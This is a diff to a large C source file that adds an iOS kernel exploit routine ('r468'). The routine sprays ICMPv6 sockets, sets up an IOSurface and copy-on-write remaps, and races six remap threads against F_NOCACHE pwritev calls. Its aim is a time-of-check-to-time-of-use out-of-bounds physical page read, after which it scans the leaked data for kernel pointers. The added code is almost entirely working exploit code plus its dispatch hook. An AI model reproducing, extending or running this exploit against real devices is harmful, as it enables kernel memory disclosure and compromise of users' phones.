@@ -17286,6 +17286,286 @@ static void r460_exploit(void) {
     #undef R460_ICMP_SPRAY
 }
 
+/* r468: Physical OOB — F_NOCACHE + 16-page IOSurface + COW + oscillation
+ *
+ * Key changes from r466/r467:
+ * - F_NOCACHE for direct I/O (UPL-based, where PHYS_CONTIG matters)
+ * - 16-page IOSurface (256KB) for wider kernel processing window
+ * - COW page 8 (middle) to 0xEE, original pages filled per-page
+ * - Detection: file page8 = original_val(0x08) → TOCTOU OOB
+ *              file page8 = 0xEE → normal remap
+ */
+struct r468_ctx {
+    volatile int go;
+    volatile int stop;
+    volatile int remap_count;
+    mach_vm_address_t target;
+    mach_vm_size_t size;
+    mach_port_t surf_entry;
+    mach_port_t cow_entry;
+};
+
+static void *r468_remap_thread(void *arg) {
+    struct r468_ctx *ctx = (struct r468_ctx *)arg;
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+    mach_port_t self = mach_task_self();
+    mach_vm_address_t tgt = ctx->target;
+    mach_vm_size_t sz = ctx->size;
+    mach_port_t se = ctx->surf_entry;
+    mach_port_t ce = ctx->cow_entry;
+    while (!ctx->go) { __asm__ volatile("yield"); }
+    while (!ctx->stop) {
+        mach_vm_address_t t = tgt;
+        mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            se, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        t = tgt;
+        kern_return_t kr = mach_vm_map(self, &t, sz, 0,
+            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+            ce, 0, FALSE,
+            VM_PROT_READ | VM_PROT_WRITE, VM_PROT_READ | VM_PROT_WRITE, VM_INHERIT_NONE);
+        if (kr == KERN_SUCCESS) __sync_fetch_and_add(&ctx->remap_count, 1);
+    }
+    return NULL;
+}
+
+static void r468_exploit(void) {
+    rlog("\n=== r468: 16-page IOSurface + COW + F_NOCACHE ===\n\n");
+    fflush(stdout);
+
+    #define R468_PAGE_SZ 16384
+    #define R468_SURF_PAGES 16
+    #define R468_SURF_SZ (R468_SURF_PAGES * R468_PAGE_SZ)
+    #define R468_COW_PAGE 8
+    #define R468_REMAP_THREADS 6
+    #define R468_ITERS 15000
+
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);
+
+    /* Phase 0: F_NOCACHE output file */
+    rlog("  --- Phase 0: Output file (F_NOCACHE) ---\n"); fflush(stdout);
+    char tmppath[256];
+    const char *tmpdir = getenv("TMPDIR");
+    int fd = -1;
+    if (tmpdir) {
+        snprintf(tmppath, sizeof(tmppath), "%s/r468_oob", tmpdir);
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) {
+        snprintf(tmppath, sizeof(tmppath), "/private/var/tmp/r468_oob_%d", getpid());
+        fd = open(tmppath, O_RDWR | O_CREAT | O_TRUNC, 0600);
+    }
+    if (fd < 0) { rlog("    FAILED\n"); rlog("\n=== r468 done ===\n"); return; }
+    fcntl(fd, F_NOCACHE, 1);
+    char *zbuf = (char *)calloc(1, R468_SURF_SZ);
+    pwrite(fd, zbuf, R468_SURF_SZ, 0);
+    free(zbuf);
+    rlog("    fd=%d sz=%dKB\n", fd, R468_SURF_SZ / 1024);
+
+    /* Phase 1: ICMPv6 spray (reduced to avoid jetsam) */
+    rlog("  --- Phase 1: ICMPv6 spray ---\n"); fflush(stdout);
+    int icmp_fds[500];
+    int icmp_count = 0;
+    for (int i = 0; i < 500; i++) {
+        icmp_fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
+        if (icmp_fds[i] < 0) break;
+        struct icmp6_filter filt;
+        ICMP6_FILTER_SETBLOCKALL(&filt);
+        ICMP6_FILTER_SETPASS(i & 0xFF, &filt);
+        setsockopt(icmp_fds[i], IPPROTO_ICMPV6, ICMP6_FILTER, &filt, sizeof(filt));
+        icmp_count++;
+    }
+    rlog("    %d sockets\n", icmp_count);
+
+    /* Phase 2: 16-page PurpleGfxMem IOSurface */
+    rlog("\n  --- Phase 2: PurpleGfxMem IOSurface (%d pages = %dKB) ---\n",
+         R468_SURF_PAGES, R468_SURF_SZ / 1024);
+    fflush(stdout);
+    CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    int pw = R468_SURF_SZ, ph = 1, pbpe = 1, ppf = 0x4C303038;
+    CFNumberRef pwn = CFNumberCreate(NULL, kCFNumberIntType, &pw);
+    CFNumberRef phn = CFNumberCreate(NULL, kCFNumberIntType, &ph);
+    CFNumberRef pbn = CFNumberCreate(NULL, kCFNumberIntType, &pbpe);
+    CFNumberRef ppn = CFNumberCreate(NULL, kCFNumberIntType, &ppf);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), pwn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), phn);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), pbn);
+    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), ppn);
+    int alloc_sz_v = R468_SURF_SZ;
+    CFNumberRef an = CFNumberCreate(NULL, kCFNumberIntType, &alloc_sz_v);
+    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), an);
+    IOSurfaceRef surf = IOSurfaceCreate(props);
+    CFRelease(props); CFRelease(pwn); CFRelease(phn); CFRelease(pbn); CFRelease(ppn); CFRelease(an);
+    if (!surf) {
+        rlog("    FAILED\n");
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath); rlog("\n=== r468 done ===\n"); return;
+    }
+    IOSurfaceLock(surf, 0, NULL);
+    void *surf_base = IOSurfaceGetBaseAddress(surf);
+    memset(surf_base, 0xAA, R468_SURF_SZ);
+    memory_object_size_t surf_memsz = R468_SURF_SZ;
+    mach_port_t surf_entry = MACH_PORT_NULL;
+    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &surf_memsz,
+        (mach_vm_address_t)(uintptr_t)surf_base,
+        VM_PROT_READ | VM_PROT_WRITE, &surf_entry, MACH_PORT_NULL);
+    IOSurfaceUnlock(surf, 0, NULL);
+    rlog("    base=%p entry=0x%x\n", surf_base, surf_entry);
+
+    /* Phase 3: COW remap (page 8 → 0xEE) */
+    rlog("\n  --- Phase 3: COW remap (COW page %d → 0xEE) ---\n", R468_COW_PAGE);
+    fflush(stdout);
+    mach_vm_address_t remap_orig = 0;
+    kr = mach_vm_allocate(mach_task_self(), &remap_orig, R468_SURF_SZ, VM_FLAGS_ANYWHERE);
+    if (kr != KERN_SUCCESS) {
+        rlog("    alloc FAILED\n");
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath);
+        mach_port_deallocate(mach_task_self(), surf_entry); CFRelease(surf);
+        rlog("\n=== r468 done ===\n"); return;
+    }
+    /* Fill each page with its index byte */
+    for (int p = 0; p < R468_SURF_PAGES; p++)
+        memset((void *)(uintptr_t)(remap_orig + p * R468_PAGE_SZ), p, R468_PAGE_SZ);
+    rlog("    Original: p0=%02x p8=%02x p15=%02x\n",
+         *(uint8_t *)(uintptr_t)remap_orig,
+         *(uint8_t *)(uintptr_t)(remap_orig + R468_COW_PAGE * R468_PAGE_SZ),
+         *(uint8_t *)(uintptr_t)(remap_orig + 15 * R468_PAGE_SZ));
+
+    mach_vm_address_t cow_addr = 0;
+    vm_prot_t cur_prot, max_prot;
+    kr = mach_vm_remap(mach_task_self(), &cow_addr, R468_SURF_SZ, 0,
+        VM_FLAGS_ANYWHERE, mach_task_self(), remap_orig,
+        TRUE, &cur_prot, &max_prot, VM_INHERIT_NONE);
+    if (kr != KERN_SUCCESS) {
+        rlog("    COW FAILED\n");
+        mach_vm_deallocate(mach_task_self(), remap_orig, R468_SURF_SZ);
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath);
+        mach_port_deallocate(mach_task_self(), surf_entry); CFRelease(surf);
+        rlog("\n=== r468 done ===\n"); return;
+    }
+    /* COW page 8 by writing 0xEE */
+    memset((void *)(uintptr_t)(cow_addr + R468_COW_PAGE * R468_PAGE_SZ), 0xEE, R468_PAGE_SZ);
+    rlog("    COW: p0=%02x p8=%02x p15=%02x (expect 00/EE/0F)\n",
+         *(uint8_t *)(uintptr_t)cow_addr,
+         *(uint8_t *)(uintptr_t)(cow_addr + R468_COW_PAGE * R468_PAGE_SZ),
+         *(uint8_t *)(uintptr_t)(cow_addr + 15 * R468_PAGE_SZ));
+    rlog("    Orig p8 still: %02x (expect 08)\n",
+         *(uint8_t *)(uintptr_t)(remap_orig + R468_COW_PAGE * R468_PAGE_SZ));
+
+    memory_object_size_t cow_memsz = R468_SURF_SZ;
+    mach_port_t cow_entry = MACH_PORT_NULL;
+    kr = mach_make_memory_entry_64(mach_task_self(), &cow_memsz,
+        cow_addr, VM_PROT_READ | VM_PROT_WRITE, &cow_entry, MACH_PORT_NULL);
+    if (kr != KERN_SUCCESS || cow_memsz != R468_SURF_SZ) {
+        rlog("    mem_entry FAILED\n");
+        mach_vm_deallocate(mach_task_self(), cow_addr, R468_SURF_SZ);
+        mach_vm_deallocate(mach_task_self(), remap_orig, R468_SURF_SZ);
+        for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+        close(fd); unlink(tmppath);
+        mach_port_deallocate(mach_task_self(), surf_entry); CFRelease(surf);
+        rlog("\n=== r468 done ===\n"); return;
+    }
+    rlog("    cow_entry=0x%x\n", cow_entry);
+
+    /* Phase 4: Oscillating TOCTOU with F_NOCACHE pwritev */
+    rlog("\n  --- Phase 4: TOCTOU (%d iters, %d threads, %dKB per write) ---\n",
+         R468_ITERS, R468_REMAP_THREADS, R468_SURF_SZ / 1024);
+    rlog("    OOB: file p8=0x08 (orig). Normal: p8=0xEE (COW). Surf: p0=0xAA\n");
+    fflush(stdout);
+
+    struct r468_ctx ctxs[R468_REMAP_THREADS];
+    pthread_t remap_tids[R468_REMAP_THREADS];
+    for (int t = 0; t < R468_REMAP_THREADS; t++) {
+        memset(&ctxs[t], 0, sizeof(struct r468_ctx));
+        ctxs[t].target = (mach_vm_address_t)(uintptr_t)surf_base;
+        ctxs[t].size = R468_SURF_SZ;
+        ctxs[t].surf_entry = surf_entry;
+        ctxs[t].cow_entry = cow_entry;
+        pthread_create(&remap_tids[t], NULL, r468_remap_thread, &ctxs[t]);
+    }
+
+    int oob_hits = 0, remap_vis = 0, surf_vis = 0, mixed = 0;
+    uint8_t *rb = (uint8_t *)malloc(R468_SURF_SZ);
+    for (int t = 0; t < R468_REMAP_THREADS; t++) ctxs[t].go = 1;
+    __sync_synchronize();
+
+    for (int iter = 0; iter < R468_ITERS; iter++) {
+        struct iovec wv = { surf_base, R468_SURF_SZ };
+        ssize_t written = pwritev(fd, &wv, 1, 0);
+        if (written != (ssize_t)R468_SURF_SZ) continue;
+
+        pread(fd, rb, R468_SURF_SZ, 0);
+        uint8_t p0 = rb[0];
+        uint8_t p8 = rb[R468_COW_PAGE * R468_PAGE_SZ];
+
+        if (p0 == 0x00 || (p0 > 0 && p0 <= 0x0F) || p0 == 0xEE) {
+            /* Remap was visible during data read */
+            if (p8 == 0x08) {
+                /* TOCTOU OOB! Page 8 from P_orig8 (adjacent to P_orig0) */
+                oob_hits++;
+                rlog("    [iter %d] *** TOCTOU OOB *** p0=%02x p8=%02x (read orig page!)\n",
+                     iter, p0, p8);
+                rlog("      File pages: ");
+                for (int p = 0; p < R468_SURF_PAGES; p++)
+                    rlog("%02x ", rb[p * R468_PAGE_SZ]);
+                rlog("\n");
+                int kptrs = 0;
+                for (int j = R468_COW_PAGE * R468_PAGE_SZ;
+                     j < (R468_COW_PAGE + 1) * R468_PAGE_SZ - 7; j += 8) {
+                    uint64_t val = *(uint64_t *)(rb + j);
+                    if ((val & 0xFFFFFFF000000000ULL) == 0xFFFFFFF000000000ULL) {
+                        if (kptrs < 10)
+                            rlog("      Kptr +%d: 0x%016llx\n", j, (unsigned long long)val);
+                        kptrs++;
+                    }
+                }
+                if (kptrs > 0) rlog("      Kernel ptrs: %d\n", kptrs);
+            } else if (p8 == 0xEE) remap_vis++;
+            else mixed++;
+        } else if (p0 == 0xAA) surf_vis++;
+        else mixed++;
+
+        if ((iter + 1) % 3000 == 0)
+            rlog("    ... %d/%d  remap=%d surf=%d oob=%d mixed=%d\n",
+                 iter + 1, R468_ITERS, remap_vis, surf_vis, oob_hits, mixed);
+    }
+
+    for (int t = 0; t < R468_REMAP_THREADS; t++) ctxs[t].stop = 1;
+    __sync_synchronize();
+    int total_osc = 0;
+    for (int t = 0; t < R468_REMAP_THREADS; t++) {
+        pthread_join(remap_tids[t], NULL);
+        total_osc += ctxs[t].remap_count;
+    }
+
+    rlog("\n    remap=%d surf=%d oob=%d mixed=%d / %d\n",
+         remap_vis, surf_vis, oob_hits, mixed, R468_ITERS);
+    rlog("    oscillations=%d\n", total_osc);
+
+    /* Cleanup */
+    free(rb);
+    for (int i = 0; i < icmp_count; i++) close(icmp_fds[i]);
+    close(fd); unlink(tmppath);
+    mach_port_deallocate(mach_task_self(), cow_entry);
+    mach_vm_deallocate(mach_task_self(), cow_addr, R468_SURF_SZ);
+    mach_vm_deallocate(mach_task_self(), remap_orig, R468_SURF_SZ);
+    mach_port_deallocate(mach_task_self(), surf_entry);
+    CFRelease(surf);
+
+    rlog("\n=== r468 done ===\n");
+
+    #undef R468_PAGE_SZ
+    #undef R468_SURF_PAGES
+    #undef R468_SURF_SZ
+    #undef R468_COW_PAGE
+    #undef R468_REMAP_THREADS
+    #undef R468_ITERS
+}
+
 /* r467: Physical OOB — COW + oscillation + preadv + aggressive
  *
  * Uses COW for non-contiguous middle page (same as r466).
@@ -86306,6 +86586,12 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 472) {
+            rlog("*** rounds=472: 16-page IOSurface + COW + F_NOCACHE ***\n\n");
+            fflush(stdout);
+            r468_exploit();
+            goto done;
+        }
         if (rounds == 471) {
             rlog("*** rounds=471: Physical OOB — COW + preadv/pwritev + 50K ***\n\n");
             fflush(stdout);
@@ -89153,7 +89439,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429 && rounds != 430 && rounds != 431 && rounds != 432 && rounds != 433 && rounds != 434 && rounds != 435 && rounds != 436 && rounds != 437 && rounds != 438 && rounds != 439 && rounds != 440 && rounds != 441 && rounds != 442 && rounds != 443 && rounds != 444 && rounds != 445 && rounds != 446 && rounds != 447 && rounds != 448 && rounds != 449 && rounds != 450 && rounds != 451 && rounds != 455 && rounds != 454 && rounds != 456 && rounds != 457 && rounds != 458 && rounds != 459 && rounds != 472 && rounds != 471 && rounds != 470 && rounds != 469 && rounds != 468 && rounds != 467 && rounds != 466 && rounds != 465 && rounds != 464 && rounds != 463 && rounds != 462 && rounds != 461 && rounds != 460 && rounds != 452 && rounds != 453) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
